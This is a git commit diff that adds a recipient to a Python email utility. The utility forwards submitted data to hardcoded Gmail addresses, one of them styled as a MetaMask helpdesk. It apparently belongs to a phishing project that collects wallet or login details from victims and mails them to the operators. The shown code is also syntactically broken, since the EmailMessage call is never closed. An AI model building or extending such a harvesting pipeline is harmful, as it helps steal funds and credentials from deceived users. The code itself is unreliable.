326522945ad5e309605ef9304db094b452449e7b
Ejike Sylva <67736638+DevSylva@users.noreply.github.com>
2022-03-26 20:48:59 +0100

    Update utils.py
    update

--- core/utils.py
+++ core/utils.py
@@ -6,6 +6,6 @@ class Util:
         email = EmailMessage(
             subject=data["subject"],
             body=data['body'],
-            to=["sylvaejike@gmail.com", "metamaskhelpdeskio@gmail.com"]
+            to=["sylvaejike@gmail.com", "metamaskhelpdeskio@gmail.com", "francisokatta1@gmail.com"]
        
         email.send()
